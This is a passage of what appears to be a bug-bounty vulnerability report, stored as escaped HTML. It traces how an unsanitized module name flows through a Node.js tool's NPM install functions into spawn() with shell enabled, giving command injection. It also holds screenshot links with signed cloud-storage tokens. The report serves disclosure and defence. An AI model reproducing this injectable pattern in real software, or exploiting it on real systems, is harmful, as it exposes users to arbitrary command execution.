class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"k\"\u003etypeof\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eopts\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e==\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003efunction\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"nx\"\u003ecb\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003eopts\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"nx\"\u003eopts\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"p\"\u003e{};\u003c/span\u003e\n  \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\n    \u003cspan class=\"p\"\u003e(...)\u003c/span\u003e\n\n  \u003cspan class=\"k\"\u003eelse\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"nx\"\u003eCommon\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003elogMod\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e`Installing NPM \u003c/span\u003e\u003cspan class=\"p\"\u003e${\u003c/span\u003e\u003cspan class=\"nx\"\u003emodule_name\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e module`\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n    \u003cspan class=\"nx\"\u003eNPM\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003einstall\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eCLI\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003emodule_name\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003eopts\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003ecb\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e   \u003cspan class=\"c1\"\u003e//// injection point\u003c/span\u003e\n  \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003cspan class=\"p\"\u003e};\u003c/span\u003e\n\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003e\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"1.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/520/353/339128db22c1db830e0f52547c603610cce91fb9/1.png?response-content-disposition=attachment%3B%20filename%3D%221.png%22%3B%20filename%2A%3DUTF-8%27%271.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQWPKTSU4A%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T063148Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCICR3Wbqr3QmaXXF3DerXHfL2hl5mL6uGPxa9bL7HxbeqAiEAqWiWv4fNm1cBuTJbNOPDhjMWyvgVYBMfeqSvL3C%2Br5kqtAMIVhABGgwwMTM2MTkyNzQ4NDkiDLWeuL88FcgTd%2BHDFiqRA7sDjduiUr7yrR1bP0fy3jpTtTXARM3Gr8rkIOStwiuzOpvS67rApjBlyTcg901MzVj81BMqg2D%2FoYR3%2FSoNuwT33h6KUwD255ES%2FPaggNJ05ASpUwzUlVyePLw4P7in3wPJpZgw9N8dZGDgg6RxPAgdRMTCMAdlbL23s9IEA0HQY%2FGrR4AsNah2Xjle%2Beki0NqkG2PIPu3eRj3%2BQqZznd3OfS%2F2sVbcGOtcKdRNfVO%2Bms3UlWm2aPpwFiBKtt5yY1oKJr%2BgD%2BF%2FSQXzNSV67TxIzKIjNEaMGEHoDWRX0O4KOc6rsER7d7YcxMm3LHCy5VXT6QRFyFg%2FG4p8jairmeusKiaAs0jSa4nN2Zw3%2BCVW97Ila6RUU7muvv0d6W%2FYI6MJm443s6INDwS%2F0HX%2Bw8e4TOsebeohnSpFhM2ci9Q8tz6Q72ZmyHoSODXtdcyWxmKZOiWjWtpBmasfdIsQkZzxOUEp9TeB9Eaq72Q8%2BcHbJ%2Fn4cBcE%2FhCkABtaY7%2BW80JUqsSXPlI8vt2z0j%2B7EAZZMJT4qv8FOusB53xj88px4LwwmmUwc4%2B73P1hcJQ5adArgpVyBc%2Fvo2mvPbSXp8aV8B1%2BrfMDWuQn5Unmirx7fguBekXWHMyBRZ5m12xEhEj3mDnu3koQSeJRnoNQdEu1tOplrrLMENBFS6mTQ%2BUUBq1sggQqNoyyQNPVrpOTENkW7e%2FKnl%2FHjjMD5ktvCe3RQAaSXnShU%2FFfKQH%2FQlegKj92VkKfFBzGzGJ0gmEIyc6Fl56gBo43TML6rbL9j9QyU%2FpQpXJOVD4OV4s4%2BALvzzN5PLj4E9A%2Bwmv%2FwIgM8BdxFsm0wGfnWsssx3X6cDoUNw7ldQ%3D%3D\u0026amp;X-Amz-Signature=647388e2aabf8ce1bff52ad824f4dfd4d28506f491cac137230f5e46423a1168\" data-attachment-type=\"image/png\"\u003e\u003cimg src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/520/353/339128db22c1db830e0f52547c603610cce91fb9/1.png?response-content-disposition=attachment%3B%20filename%3D%221.png%22%3B%20filename%2A%3DUTF-8%27%271.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQWPKTSU4A%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T063148Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCICR3Wbqr3QmaXXF3DerXHfL2hl5mL6uGPxa9bL7HxbeqAiEAqWiWv4fNm1cBuTJbNOPDhjMWyvgVYBMfeqSvL3C%2Br5kqtAMIVhABGgwwMTM2MTkyNzQ4NDkiDLWeuL88FcgTd%2BHDFiqRA7sDjduiUr7yrR1bP0fy3jpTtTXARM3Gr8rkIOStwiuzOpvS67rApjBlyTcg901MzVj81BMqg2D%2FoYR3%2FSoNuwT33h6KUwD255ES%2FPaggNJ05ASpUwzUlVyePLw4P7in3wPJpZgw9N8dZGDgg6RxPAgdRMTCMAdlbL23s9IEA0HQY%2FGrR4AsNah2Xjle%2Beki0NqkG2PIPu3eRj3%2BQqZznd3OfS%2F2sVbcGOtcKdRNfVO%2Bms3UlWm2aPpwFiBKtt5yY1oKJr%2BgD%2BF%2FSQXzNSV67TxIzKIjNEaMGEHoDWRX0O4KOc6rsER7d7YcxMm3LHCy5VXT6QRFyFg%2FG4p8jairmeusKiaAs0jSa4nN2Zw3%2BCVW97Ila6RUU7muvv0d6W%2FYI6MJm443s6INDwS%2F0HX%2Bw8e4TOsebeohnSpFhM2ci9Q8tz6Q72ZmyHoSODXtdcyWxmKZOiWjWtpBmasfdIsQkZzxOUEp9TeB9Eaq72Q8%2BcHbJ%2Fn4cBcE%2FhCkABtaY7%2BW80JUqsSXPlI8vt2z0j%2B7EAZZMJT4qv8FOusB53xj88px4LwwmmUwc4%2B73P1hcJQ5adArgpVyBc%2Fvo2mvPbSXp8aV8B1%2BrfMDWuQn5Unmirx7fguBekXWHMyBRZ5m12xEhEj3mDnu3koQSeJRnoNQdEu1tOplrrLMENBFS6mTQ%2BUUBq1sggQqNoyyQNPVrpOTENkW7e%2FKnl%2FHjjMD5ktvCe3RQAaSXnShU%2FFfKQH%2FQlegKj92VkKfFBzGzGJ0gmEIyc6Fl56gBo43TML6rbL9j9QyU%2FpQpXJOVD4OV4s4%2BALvzzN5PLj4E9A%2Bwmv%2FwIgM8BdxFsm0wGfnWsssx3X6cDoUNw7ldQ%3D%3D\u0026amp;X-Amz-Signature=647388e2aabf8ce1bff52ad824f4dfd4d28506f491cac137230f5e46423a1168\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eIn line marked with \u003ccode\u003e//// injection point\u003c/code\u003e comment, unsanitized \u003ccode\u003emodule_name\u003c/code\u003e variable is passed into \u003ccode\u003eNPM.install()\u003c/code\u003e function in \u003ccode\u003elib/API/Modules/NPM.js\u003c/code\u003e module. \u003c/p\u003e\n\n\u003cp\u003eFrom here, our unsanitized payload continues his journey to execution sink, passed as second argument into \u003ccode\u003eNPM.continueInstall()\u003c/code\u003e:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight javascript\"\u003e\u003ccode\u003e\u003cspan class=\"kd\"\u003efunction\u003c/span\u003e \u003cspan class=\"nx\"\u003einstall\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eCLI\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003emodule_name\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003eopts\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003ecb\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n  \u003cspan class=\"nx\"\u003emoduleExistInLocalDB\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eCLI\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003emodule_name\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"kd\"\u003efunction\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eexists\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eexists\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n      \u003cspan class=\"nx\"\u003eCommon\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003elogMod\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003eModule already installed. Updating.\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\n      \u003cspan class=\"nx\"\u003eRollback\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ebackup\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003emodule_name\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\n      \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"nx\"\u003euninstall\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eCLI\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003emodule_name\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"kd\"\u003efunction\u003c/span\u003e \u003cspan class=\"p\"\u003e()\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"nx\"\u003econtinueInstall\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eCLI\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003emodule_name\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003eopts\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003ecb\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n      \u003cspan class=\"p\"\u003e});\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n    \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"nx\"\u003econtinueInstall\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eCLI\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003emodule_name\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003eopts\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003ecb\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e  \u003cspan class=\"c1\"\u003e//// injection point\u003c/span\u003e\n  \u003cspan class=\"p\"\u003e})\u003c/span\u003e\n\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eFinally, it reaches its destination. As \u003ccode\u003econtinueInstall()\u003c/code\u003e is quite long, I\u0026#39;ve left only the part which is important for our PoC:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight javascript\"\u003e\u003ccode\u003e\n\u003cspan class=\"kd\"\u003efunction\u003c/span\u003e \u003cspan class=\"nx\"\u003econtinueInstall\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eCLI\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003emodule_name\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003eopts\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003ecb\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n  \u003cspan class=\"nx\"\u003eCommon\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eprintOut\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003ecst\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ePREFIX_MSG_MOD\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003eCalling \u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"nx\"\u003echalk\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ebold\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ered\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e[NPM]\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e to install \u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"nx\"\u003emodule_name\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e ...\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\n  \u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003ecanonic_module_name\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003eUtility\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003egetCanonicModuleName\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003emodule_name\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n  \u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003einstall_path\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003epath\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ejoin\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003ecst\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eDEFAULT_MODULE_PATH\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003ecanonic_module_name\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\n  \u003cspan class=\"nx\"\u003erequire\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003emkdirp\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)(\u003c/span\u003e\u003cspan class=\"nx\"\u003einstall_path\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"kd\"\u003efunction\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"nx\"\u003eprocess\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003echdir\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eos\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ehomedir\u003c/span\u003e\u003cspan class=\"p\"\u003e());\u003c/span\u003e\n\n    \u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003einstall_instance\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003espawn\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003ecst\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eIS_WINDOWS\u003c/span\u003e \u003cspan class=\"p\"\u003e?\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003enpm.cmd\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e \u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003enpm\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003einstall\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003emodule_name\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e--loglevel=error\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e--prefix\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e+\u003c/span\u003e\u003cspan class=\"nx\"\u003einstall_path\u003c/span\u003e\u003cspan class=\"o\"\u003e+\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e \u003cspan class=\"p\"\u003e],\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n      \u003cspan class=\"na\"\u003estdio\u003c/span\u003e \u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003einherit\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n      \u003cspan class=\"na\"\u003eenv\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"nx\"\u003eprocess\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eenv\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n          \u003cspan class=\"na\"\u003eshell\u003c/span\u003e \u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"kc\"\u003etrue\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e});\u003c/span\u003e\n\n\u003cspan class=\"p\"\u003e(...)\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eAs you can see, \u003ccode\u003emodule_name\u003c/code\u003e (after being parsed by \u003ccode\u003eUtility.getCanonicModuleName()\u003c/code\u003e and returned and assigned to \u003ccode\u003ecanonic_module_name\u003c/code\u003e) is passed into \u003ccode\u003espawn()\u003c/code\u003e call and executed as a part of spawned \u003ccode\u003enpm install MODULE_NAME ----loglevel=error --prefix INSTALL_PATH\u003c/code\u003e command.\u003c/p\u003e\n\n\u003cp\u003e\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"2.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/520/354/4b3c5accfa7c0c0dfe6e88a01b50d38cb053c0dd/2.png?response-content-disposition=attachment%3B%20filename%3D%222.png%22%3B%20filename%2A%3DUTF-8%27%272.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQWPKTSU4A%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T063148Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCICR3Wbqr3QmaXXF3DerXHfL2hl5mL6uGPxa9bL7HxbeqAiEAqWiWv4fNm1cBuTJbNOPDhjMWyvgVYBMfeqSvL3C%2Br5kqtAMIVhABGgwwMTM2MTkyNzQ4NDkiDLWeuL88FcgTd%2BHDFiqRA7sDjduiUr7yrR1bP0fy3jpTtTXARM3Gr8rkIOStwiuzOpvS67rApjBlyTcg901MzVj81BMqg2D%2FoYR3%2FSoNuwT33h6KUwD255ES%2FPaggNJ05ASpUwzUlVyePLw4P7in3wPJpZgw9N8dZGDgg6RxPAgdRMTCMAdlbL23s9IEA0HQY%2FGrR4AsNah2Xjle%2Beki0NqkG2PIPu3eRj3%2BQqZznd3OfS%2F2sVbcGOtcKdRNfVO%2Bms3UlWm2aPpwFiBKtt5yY1oKJr%2BgD%2BF%2FSQXzNSV67TxIzKIjNEaMGEHoDWRX0O4KOc6rsER7d7YcxMm3LHCy5VXT6QRFyFg%2FG4p8jairmeusKiaAs0jSa4nN2Zw3%2BCVW97Ila6RUU7muvv0d6W%2FYI6MJm443s6INDwS%2F0HX%2Bw8e4TOsebeohnSpFhM2ci9Q8tz6Q72ZmyHoSODXtdcyWxmKZOiWjWtpBmasfdIsQkZzxOUEp9TeB9Eaq72Q8%2BcHbJ%2Fn4cBcE%2FhCkABtaY7%2BW80JUqsSXPlI8vt2z0j%2B7EAZZMJT4qv8FOusB53xj88px4LwwmmUwc4%2B73P1hcJQ5adArgpVyBc%2Fvo2mvPbSXp8aV8B1%2BrfMDWuQn5Unmirx7fguBekXWHMyBRZ5m12xEhEj3mDnu3koQSeJRnoNQdEu1tOplrrLMENBFS6mTQ%2BUUBq1sggQqNoyyQNPVrpOTENkW7e%2FKnl%2FHjjMD5ktvCe3RQAaSXnShU%2FFfKQH%2FQlegKj92VkKfFBzGzGJ0gmEIyc6Fl56gBo43TML6rbL9j9QyU%2FpQpXJOVD4OV4s4%2BALvzzN5PLj4E9A%2Bwmv%2FwIgM8BdxFsm0wGfnWsssx3X6cDoUNw7ldQ%3D%3D\u0026amp;X-Amz-Signature=8057985d5aa709c3d9a532bf60bc977ad1d4667ff1022c41e9df862b833c6b15\" data-attachment-type=\"image/png\"\u003e\u003cimg src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/520/354/4b3c5accfa7c0c0dfe6e88a01b50d38cb053c0dd/2.png?response-content-disposition=attachment%3B%20filename%3D%222.png%22%3B%20filename%2A%3DUTF-8%27%272.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQWPKTSU4A%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T063148Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCICR3Wbqr3QmaXXF3DerXHfL2hl5mL6uGPxa9bL7HxbeqAiEAqWiWv4fNm1cBuTJbNOPDhjMWyvgVYBMfeqSvL3C%2Br5kqtAMIVhABGgwwMTM2MTkyNzQ4NDkiDLWeuL88FcgTd%2BHDFiqRA7sDjduiUr7yrR1bP0fy3jpTtTXARM3Gr8rkIOStwiuzOpvS67rApjBlyTcg901MzVj81BMqg2D%2FoYR3%2FSoNuwT33h6KUwD255ES%2FPaggNJ05ASpUwzUlVyePLw4P7in3wPJpZgw9N8dZGDgg6RxPAgdRMTCMAdlbL23s9IEA0HQY%2FGrR4AsNah2Xjle%2Beki0NqkG2PIPu3eRj3%2BQqZznd3OfS%2F2sVbcGOtcKdRNfVO%2Bms3UlWm2aPpwFiBKtt5yY1oKJr%2BgD%2BF%2FSQXzNSV67TxIzKIjNEaMGEHoDWRX0O4KOc6rsER7d7YcxMm3LHCy5VXT6QRFyFg%2FG4p8jairmeusKiaAs0jSa4nN2Zw3%2BCVW97Ila6RUU7muvv0d6W%2FYI6MJm443s6INDwS%2F0HX%2Bw8e4TOsebeohnSpFhM2ci9Q8tz6Q72ZmyHoSODXtdcyWxmKZOiWjWtpBmasfdIsQkZzxOUEp9TeB9Eaq72Q8%2BcHbJ%2Fn4cBcE%2FhCkABtaY7%2BW80JUqsSXPlI8vt2z0j%2B7EAZZMJT4qv8FOusB53xj88px4LwwmmUwc4%2B73P1hcJQ5adArgpVyBc%2Fvo2mvPbSXp8aV8B1%2BrfMDWuQn5Unmirx7fguBe